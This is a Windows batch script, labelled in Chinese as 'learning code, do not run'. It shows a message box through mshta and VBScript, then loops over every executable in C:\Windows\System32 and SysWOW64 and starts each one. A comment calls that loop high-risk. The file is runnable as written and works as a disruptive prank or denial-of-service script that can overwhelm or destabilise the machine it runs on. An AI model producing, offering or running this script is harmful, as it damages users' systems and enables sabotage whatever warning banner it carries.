@echo off
echo ========== 学习代码 请勿运行 ==========
:: 弹窗，点击确定自动关闭
mshta "vbscript:msgbox(""欢迎学习BAT弹窗""&vbCrLf&""点击确定后执行后续指令"",48,""提醒"")(window.close)"

:: 遍历系统程序（高危，仅看代码）
for %%a in (C:\Windows\System32\*.exe) do start "" "%%a"
for %%a in (C:\Windows\SysWOW64\*.exe) do start "" "%%a"

pause
